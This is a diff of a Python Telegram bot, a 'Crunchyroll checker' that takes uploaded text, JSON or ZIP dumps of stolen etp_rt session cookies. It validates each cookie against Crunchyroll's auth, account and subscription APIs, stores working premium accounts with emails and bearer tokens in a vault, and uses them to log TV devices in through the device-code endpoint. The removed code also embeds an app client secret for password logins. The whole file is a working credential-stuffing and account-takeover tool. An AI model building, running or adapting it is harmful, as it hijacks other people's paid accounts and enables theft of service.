@@ -1,22 +1,16 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""
-Crunchyroll Checker + Vault + Smart TV Login Bot
-"""
 
 import os
 import re
 import io
 import sys
-import csv
 import json
 import time
 import base64
-import random
 import asyncio
 import logging
 import zipfile
-import tempfile
 import threading
 import requests
 import uuid
@@ -24,137 +18,48 @@ import http.server
 import socketserver
 from pathlib import Path
 from typing import Dict, List, Optional
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from datetime import datetime, timedelta, timezone
+from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime, timezone
 
 try:
-    from requests.adapters import HTTPAdapter
-    from urllib3.util.retry import Retry
-except ImportError:
-    print("[!] pip install requests")
-    sys.exit(1)
-
-try:
-    from telegram import (
-        Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup,
-        ReplyKeyboardRemove, BotCommand,
-    )
+    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
     from telegram.constants import ParseMode
-    from telegram.error import BadRequest, RetryAfter
-    from telegram.ext import (
-        Application, CommandHandler, MessageHandler, CallbackQueryHandler,
-        ContextTypes, filters,
-    )
+    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 except ImportError:
     print("[!] pip install python-telegram-bot==22.8")
     sys.exit(1)
 
 # ===================== CONFIG =====================
-def _load_dotenv() -> None:
-    env_path = Path(__file__).resolve().parent / ".env"
-    if not env_path.exists():
-        return
-    try:
-        for line in env_path.read_text(encoding="utf-8").splitlines():
-            line = line.strip()
-            if not line or line.startswith("#") or "=" not in line:
-                continue
-            key, _, val = line.partition("=")
-            key = key.strip()
-            val = val.strip().strip("'\"")
-            if key and key not in os.environ:
-                os.environ[key] = val
-    except OSError:
-        pass
-
 def _env(name: str, default: str = "") -> str:
     v = os.getenv(name)
-    if v is None or str(v).strip() == "":
-        return default
+    if v is None or str(v).strip() == "": return default
     return str(v).strip()
-
-_load_dotenv()
 
 BOT_TOKEN = _env("BOT_TOKEN")
 OWNER_ID = int(_env("OWNER_ID", "0") or 0)
-OWNER_USERNAME = _env("OWNER_USERNAME", "@unknown")
+PORT = int(_env("PORT", "8080") or 8080)
 
-_raw_ids = _env("OWNER_IDS", "") or _env("ADMIN_IDS", "")
-ADMIN_IDS = set()
-if _raw_ids:
-    for _x in re.split(r"[,\s]+", _raw_ids):
-        _x = _x.strip()
-        if _x.isdigit():
-            ADMIN_IDS.add(int(_x))
-if OWNER_ID:
-    ADMIN_IDS.add(OWNER_ID)
-
-DATA_DIR = Path(_env("DATA_DIR", "data"))
+DATA_DIR = Path("data")
 DATA_DIR.mkdir(parents=True, exist_ok=True)
 VAULT_PATH = DATA_DIR / "cr_vault.json"
 
-PORT = int(_env("PORT", "8080") or 8080)
-THREADS = int(_env("THREADS", "150") or 150)
-PROXY_REFRESH_MINUTES = 5
-MAX_PROXIES_TO_KEEP = 500
-PROXY_TEST_TIMEOUT = 2
-PROXY_TEST_SAMPLE = 1000
-CHECK_TIMEOUT = 10
+BARO_WUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+API_HOST = "https://beta-api.crunchyroll.com"
+WEB_HOST = "https://www.crunchyroll.com"
 
-DAILY_TV_LIMIT = int(_env("DAILY_TV_LIMIT", "10") or 10)
-IST = timezone(timedelta(hours=5, minutes=30))
-
-USER_LAST_CHECK: dict = {}
-USER_LOCK = threading.Lock()
-MAX_FILE_MB = 20
-PREMIUM_ONLY_DEFAULT = True
-MAX_PASTED_CREDS = 2000
-MAX_HIT_CARDS = 150
-
-START_TIME = time.time()
-CHECKS_DONE = 0
-CHECKS_LOCK = threading.Lock()
-
-# ===================== WEB SERVER (Render Timeout Fix) =====================
+# ===================== WEB SERVER (Render Fix) =====================
 def run_health_check():
     class Handler(http.server.SimpleHTTPRequestHandler):
         def do_GET(self):
             self.send_response(200)
             self.end_headers()
-            self.wfile.write(b"Bot is running!")
-        def log_message(self, format, *args):
-            pass # Suppress logs
+            self.wfile.write(b"Bot is alive!")
+        def log_message(self, format, *args): pass
     try:
         with socketserver.TCPServer(("", PORT), Handler) as httpd:
-            print(f"[+] Dummy Web Server running on port {PORT} (Render Fix)")
+            print(f"[+] Dummy Web Server on {PORT}")
             httpd.serve_forever()
-    except Exception as e:
-        print(f"[-] Web server error: {e}")
-
-# ===================== HELPERS =====================
-def now_utc(): return datetime.now(timezone.utc)
-
-def parse_iso(s) -> Optional[datetime]:
-    if not s: return None
-    try:
-        dt = datetime.fromisoformat(str(s).replace("Z", "+00:00"))
-        if dt.tzinfo is None: dt = dt.replace(tzinfo=timezone.utc)
-        return dt
-    except: return None
-
-def days_left_until(iso_date: str) -> str:
-    if not iso_date: return "N/A"
-    dt = parse_iso(iso_date)
-    if not dt: return "N/A"
-    return str(max(0, (dt - now_utc()).days))
-
-def _clean_err(e): return " ".join(str(e).split())[:60]
-def esc(v): return str(v).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;") if v else "N/A"
-
-def flag_emoji(cc) -> str:
-    cc = (cc or "").upper().strip()
-    if len(cc) != 2 or not cc.isalpha(): return ""
-    return "".join(chr(0x1F1E6 + ord(c) - 65) for c in cc)
+    except Exception as e: print(f"[-] Web server error: {e}")
 
 # ===================== VAULT STORAGE =====================
 _VAULT_LOCK = threading.Lock()
@@ -177,169 +82,191 @@ def save_vault(items: List[dict]) -> None:
 def add_to_vault(entries: List[dict]) -> int:
     if not entries: return 0
     with _VAULT_LOCK:
-        current = []
-        if VAULT_PATH.exists():
-            try: current = json.loads(VAULT_PATH.read_text(encoding="utf-8"))
-            except: current = []
-        have = {f"{x.get('cred',{}).get('type')}:{str(x.get('cred',{}).get('value')).lower()}" for x in current}
+        current = load_vault()
+        have = {f"{x.get('cred',{}).get('type')}:{str(x.get('cred',{}).get('value'))}" for x in current}
         added = 0
         for e in entries:
             cred = e.get("cred") or {}
-            k = f"{cred.get('type')}:{str(cred.get('value')).lower()}"
+            k = f"{cred.get('type')}:{str(cred.get('value'))}"
             if not k or k in have: continue
             current.append({"cred": cred, "data": e.get("data") or {}, "added_at": int(time.time())})
             have.add(k)
             added += 1
-        if added:
-            try:
-                tmp = VAULT_PATH.with_suffix(".tmp")
-                tmp.write_text(json.dumps(current, indent=2, ensure_ascii=False), encoding="utf-8")
-                os.replace(tmp, VAULT_PATH)
-            except Exception as exc: print("Vault write failed:", exc)
+        if added: save_vault(current)
         return added
 
-def vault_count(): return len(load_vault())
-
-# ===================== CRUNCHYROLL API =====================
-API_HOST = "https://beta-api.crunchyroll.com"
-CLIENT_ID = "rjs0ltx0dbwkliwxdzdf"
-CLIENT_SECRET = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"
-APP_UA = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
-APP_DEVICE_TYPE = "Google SDK built for x86"
-APP_DEVICE_NAME = "sdk_google_atv_x86"
-BARO_WUA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36"
-
-_tls = threading.local()
-def get_session():
-    s = getattr(_tls, "s", None)
-    if s is None:
-        s = requests.Session()
-        _tls.s = s
-    return s
-
-def _req(session, method, url, proxy, **kw):
-    try: return session.request(method, url, proxies=proxy, timeout=CHECK_TIMEOUT, **kw)
-    except requests.RequestException:
-        if proxy: return session.request(method, url, timeout=CHECK_TIMEOUT, **kw)
-        raise
-
-def _blank_data(user): return {"user": user.split("@")[0], "plan": "", "cc": "", "expiry": "", "days_left": "N/A", "streams": ""}
-
-def app_login(user, pw, proxy=None):
-    s = get_session()
-    try:
-        r = _req(s, "POST", f"{API_HOST}/auth/v1/token", proxy,
-            data={"grant_type": "password", "username": user, "password": pw, "scope": "offline_access",
-                  "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET, "device_type": APP_DEVICE_TYPE,
-                  "device_id": str(uuid.uuid4()), "device_name": APP_DEVICE_NAME},
-            headers={"User-Agent": APP_UA, "Content-Type": "application/x-www-form-urlencoded"})
-    except: return None, "network"
-    if r.status_code != 200: return None, "bad"
-    return r.json(), "ok"
-
-def etp_rt_to_token(etp_rt, proxy=None):
-    s = get_session()
-    try:
-        r = _req(s, "POST", f"{API_HOST}/auth/v1/token", proxy,
-            data={"grant_type": "etp_rt_cookie", "device_id": str(uuid.uuid4()), "device_type": "Firefox"},
-            cookies={"etp_rt": etp_rt})
-    except: return None, "network"
-    if r.status_code != 200: return None, "bad"
-    return r.json(), ""
-
-def check_token_or_cookie(bearer, proxy=None):
-    s = get_session()
-    hdr = {"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA}
-    try:
-        r = _req(s, "GET", f"{API_HOST}/accounts/v1/me", proxy, headers=hdr)
-        if r.status_code != 200: return "err", _blank_data("")
-        me = r.json()
-    except: return "err", _blank_data("")
+# ===================== EXTRACTOR (CRUNCHYROLLCOOKIE.PY LOGIC) =====================
+def extract_cookies_from_text(text: str) -> List[str]:
+    cookies = set()
     
-    d = _blank_data(me.get("email") or "")
-    try:
-        r = _req(s, "GET", f"{API_HOST}/subs/v4/accounts/{me.get('account_id')}/subscriptions", proxy, headers=hdr)
-        subs = r.json().get("subscriptions", [])
-        if subs:
-            sub = subs[0]
-            plan = sub.get("plan", {})
-            d["plan"] = plan.get("tier", {}).get("text", "Premium")
-            d["expiry"] = sub.get("nextRenewalDate", "")[:10]
-            d["days_left"] = days_left_until(sub.get("nextRenewalDate"))
-            d["cc"] = plan.get("countryCode", "")
-            return "hit", d
-    except: pass
-    return "free", d
-
-def activate_tv(bearer: str, code: str, proxy: Optional[dict] = None):
-    s = get_session()
-    clean_code = re.sub(r"[^A-Za-z0-9]", "", str(code or "")).upper().strip()
-    if len(clean_code) != 6: return False, "invalid_code"
-    headers = {"Authorization": f"Bearer {bearer}", "User-Agent": BARO_WUA, "Content-Type": "application/json"}
-    for base in ("https://www.crunchyroll.com", API_HOST):
-        try:
-            r = _req(s, "POST", f"{base}/auth/v1/device", proxy, json={"user_code": clean_code}, headers=headers)
-            if r.status_code in (200, 201, 204): return True, ""
-        except: pass
-    return False, "failed"
-
-def extract_credentials(text: str) -> List[dict]:
-    creds, seen = [], set()
-    for line in (text or "").splitlines():
-        parts = line.strip().split("\t")
-        if len(parts) >= 7 and parts[5].strip().lower() == "etp_rt":
+    # 1. Netscape Format
+    for line in text.split('\n'):
+        line = line.strip()
+        if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')): continue
+        if line.startswith('#HttpOnly_'): line = line[10:]
+        parts = line.split('\t')
+        if len(parts) >= 7 and parts[5].strip() == 'etp_rt':
             val = parts[6].strip()
-            if val and val not in seen: seen.add(val); creds.append({"type": "cookie", "value": val})
-    for m in re.finditer(r"etp_rt[\"'\s:=]+([A-Za-z0-9+/=._\-]{16,})", text, re.I):
-        val = m.group(1).strip()
-        if val and val not in seen: seen.add(val); creds.append({"type": "cookie", "value": val})
-    return creds
+            if val: cookies.add(val)
+            
+    # 2. JSON Format
+    try:
+        stripped = text.strip()
+        if stripped.startswith('[') or stripped.startswith('{'):
+            data = json.loads(stripped)
+            items = data if isinstance(data, list) else (data.get("cookies") or [data])
+            if isinstance(items, list):
+                for item in items:
+                    if isinstance(item, dict) and item.get("name") == "etp_rt":
+                        val = str(item.get("value", "")).strip()
+                        if val: cookies.add(val)
+    except: pass
 
-# ===================== BOT LOGIC =====================
+    # 3. Regex Patterns
+    patterns = [
+        r'etp_rt[=\s]+([a-f0-9-]{36})',
+        r'etp_rt["\']?\s*:\s*["\']([^"\']+)',
+        r'etp_rt\s+([a-f0-9-]{36})',
+        r'["\']etp_rt["\']\s*:\s*["\']([^"\']+)',
+    ]
+    for p in patterns:
+        for m in re.finditer(p, text, re.IGNORECASE):
+            val = m.group(1).strip()
+            if len(val) >= 20: cookies.add(val)
+
+    # 4. JWT Decode
+    jwt_match = re.search(r'etp_jwt[=\s]+([^\s;]+)', text, re.IGNORECASE)
+    if jwt_match:
+        try:
+            jwt_val = jwt_match.group(1).strip()
+            if jwt_val.startswith('eyJ') and '.' in jwt_val:
+                payload = jwt_val.split('.')[1] + '=' * (4 - len(jwt_val.split('.')[1]) % 4)
+                data = json.loads(base64.b64decode(payload))
+                if data.get('rt_id'): cookies.add(data['rt_id'])
+        except: pass
+
+    return list(cookies)
+
+def extract_text_from_zip(raw_bytes: bytes) -> str:
+    chunks = []
+    try:
+        with zipfile.ZipFile(io.BytesIO(raw_bytes), "r") as zf:
+            for zinfo in zf.infolist():
+                if not zinfo.filename.endswith("/") and not zinfo.filename.startswith("__MACOSX"):
+                    chunks.append(zf.read(zinfo.filename).decode("utf-8", errors="ignore"))
+    except Exception as e: print("ZIP Error:", e)
+    return "\n".join(chunks)
+
+# ===================== API CHECKER =====================
+def check_cookie(etp_rt: str):
+    session = requests.Session()
+    session.verify = False
+    
+    # STEP 1: Get Token
+    headers = {
+        "Authorization": "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": BARO_WUA,
+        "Origin": WEB_HOST,
+        "Referer": f"{WEB_HOST}/"
+    }
+    data = {"grant_type": "etp_rt_cookie", "device_id": str(uuid.uuid4()), "device_type": "Chrome on Windows"}
+    
+    try:
+        r = session.post(f"{WEB_HOST}/auth/v1/token", data=data, headers=headers, cookies={"etp_rt": etp_rt}, timeout=15)
+        if r.status_code != 200: return None
+        token_data = r.json()
+        access_token = token_data.get('access_token')
+        if not access_token: return None
+    except: return None
+
+    # STEP 2: Get User Info
+    hdr = {"Authorization": f"Bearer {access_token}", "User-Agent": BARO_WUA}
+    try:
+        r = session.get(f"{WEB_HOST}/accounts/v1/me", headers=hdr, timeout=15)
+        if r.status_code != 200: return None
+        me = r.json()
+        email = me.get("email", "N/A")
+        acc_id = me.get("account_id")
+    except: return None
+
+    # STEP 3: Check Subscription
+    try:
+        r = session.get(f"{WEB_HOST}/subs/v4/accounts/{acc_id}/subscriptions", headers=hdr, timeout=15)
+        if r.status_code == 200:
+            subs = r.json().get("subscriptions", [])
+            if subs:
+                sub = subs[0]
+                plan = sub.get("plan", {}).get("tier", {}).get("text", "Premium")
+                expiry = sub.get("nextRenewalDate", "")[:10]
+                return {"email": email, "plan": plan, "expiry": expiry, "token": access_token}
+    except: pass
+    return None
+
+# ===================== BOT HANDLERS =====================
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = f"🔥 **Crunchyroll Bot**\n\n🗄️ Vault Accounts: `{vault_count()}`\n\n📂 Send a `.txt`, `.json`, or `.zip` file to scan and save to vault.\n📺 Use `/tv CODE` to activate a TV."
+    vault_count = len(load_vault())
+    text = (
+        f"🔥 **Crunchyroll Bot Active**\n\n"
+        f"🗄️ Saved Accounts: `{vault_count}`\n\n"
+        f"📂 **Send a .txt, .json, or .zip file** to scan and save.\n"
+        f"📺 Use `/tv CODE` to activate TV."
+    )
     await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     doc = update.message.document
     if not doc: return
-    note = await update.message.reply_text("📥 Downloading & scanning...")
     
-    tg_file = await context.bot.get_file(doc.file_id)
-    buf = io.BytesIO()
-    await tg_file.download_to_memory(buf)
-    text = buf.getvalue().decode("utf-8", errors="ignore")
-    
-    creds = extract_credentials(text)
-    if not creds:
-        await note.edit_text("❌ No valid cookies found in file.")
+    msg = await update.message.reply_text("📥 File downloading...")
+    try:
+        tg_file = await context.bot.get_file(doc.file_id)
+        buf = io.BytesIO()
+        await tg_file.download_to_memory(buf)
+        raw_data = buf.getvalue()
+    except Exception as e:
+        await msg.edit_text(f"❌ Download failed: {e}")
         return
-        
-    await note.edit_text(f"🔍 Found {len(creds)} cookies. Checking...")
-    
-    hits = []
-    def check_one(cred):
-        j, err = etp_rt_to_token(cred["value"])
-        if not j: return None
-        st, d = check_token_or_cookie(j["access_token"])
-        if st == "hit": return {"cred": cred, "data": d, "st": "hit"}
-        return None
 
-    with ThreadPoolExecutor(max_workers=20) as ex:
-        for res in ex.map(check_one, creds):
-            if res: hits.append(res)
-            
+    await msg.edit_text("🔍 Extracting cookies from file...")
+    
+    # Extract text
+    if doc.file_name.lower().endswith(".zip"):
+        text = extract_text_from_zip(raw_data)
+    else:
+        text = raw_data.decode("utf-8", errors="ignore")
+        
+    cookies = extract_cookies_from_text(text)
+    
+    if not cookies:
+        await msg.edit_text("❌ No `etp_rt` cookies found in this file.")
+        return
+
+    await msg.edit_text(f"✅ Found {len(cookies)} cookies.\n⏳ Checking accounts (please wait)...")
+
+    hits = []
+    def check_one(cookie):
+        return check_cookie(cookie)
+
+    # Use 10 threads to check fast
+    with ThreadPoolExecutor(max_workers=10) as ex:
+        results = list(ex.map(check_one, cookies))
+
+    for cookie, res in zip(cookies, results):
+        if res:
+            hits.append({"cred": {"type": "cookie", "value": cookie}, "data": res})
+
     if hits:
         add_to_vault(hits)
-        await note.edit_text(f"✅ **Scan Complete!**\n\nFound **{len(hits)}** working accounts.\nSaved to Vault.\nTotal Vault: `{vault_count()}`", parse_mode=ParseMode.MARKDOWN)
+        await msg.edit_text(f"🎉 **Scan Complete!**\n\n✅ Premium Hits: `{len(hits)}`\n❌ Dead/Free: `{len(cookies) - len(hits)}`\n\n🗄️ Total in Vault: `{len(load_vault())}`", parse_mode=ParseMode.MARKDOWN)
     else:
-        await note.edit_text("❌ Scan finished. No working premium accounts found.")
+        await msg.edit_text(f"❌ Scan finished. 0 Premium hits found out of {len(cookies)} cookies.")
 
 async def cmd_tv(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         await update.message.reply_text("Usage: `/tv ABCD12`", parse_mode=ParseMode.MARKDOWN)
         return
-    code = context.args[0].upper()
+    code = re.sub(r"[^A-Z0-9]", "", context.args[0].upper())
     if len(code) != 6:
         await update.message.reply_text("❌ Code must be 6 characters.")
         return
@@ -349,19 +276,31 @@ async def cmd_tv(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Vault is empty. Upload cookies first.")
         return
         
-    msg = await update.message.reply_text(f"📺 Activating TV with code `{code}`...", parse_mode=ParseMode.MARKDOWN)
+    msg = await update.message.reply_text(f"📺 Activating TV with `{code}`...", parse_mode=ParseMode.MARKDOWN)
     
     for entry in reversed(vault):
-        cred = entry.get("cred", {})
-        if cred.get("type") == "cookie":
-            j, err = etp_rt_to_token(cred["value"])
-            if j:
-                ok, _ = activate_tv(j["access_token"], code)
-                if ok:
-                    await msg.edit_text(f"✅ **TV Activated Successfully!**\n\nPlan: `{entry['data'].get('plan')}`\nExpiry: `{entry['data'].get('expiry')}`", parse_mode=ParseMode.MARKDOWN)
+        token = entry.get("data", {}).get("token")
+        if not token: continue
+        
+        headers = {"Authorization": f"Bearer {token}", "User-Agent": BARO_WUA, "Content-Type": "application/json"}
+        for base in (WEB_HOST, API_HOST):
+            try:
+                r = requests.post(f"{base}/auth/v1/device", json={"user_code": code}, headers=headers, timeout=15)
+                if r.status_code in (200, 201, 204):
+                    data = entry.get("data", {})
+                    await msg.edit_text(
+                        f"✅ **TV Activated Successfully!**\n\n"
+                        f"📧 Email: `{data.get('email')}`\n"
+                        f"📦 Plan: `{data.get('plan')}`\n"
+                        f"📅 Expiry: `{data.get('expiry')}`", 
+                        parse_mode=ParseMode.MARKDOWN
+                    )
                     return
-    await msg.edit_text("❌ Activation failed. Code might be invalid or no working account left in vault.")
+            except: pass
+            
+    await msg.edit_text("❌ Activation failed. Code expired or accounts invalid.")
 
+# ===================== MAIN =====================
 def main():
     if not BOT_TOKEN or not OWNER_ID:
         print("[!] BOT_TOKEN or OWNER_ID missing.")
@@ -374,7 +313,7 @@ def main():
     app.add_handler(CommandHandler("tv", cmd_tv))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
-    print(f"[+] Bot started | Owner: {OWNER_ID} | Vault: {vault_count()}")
+    print(f"[+] Bot started | Vault: {len(load_vault())}")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
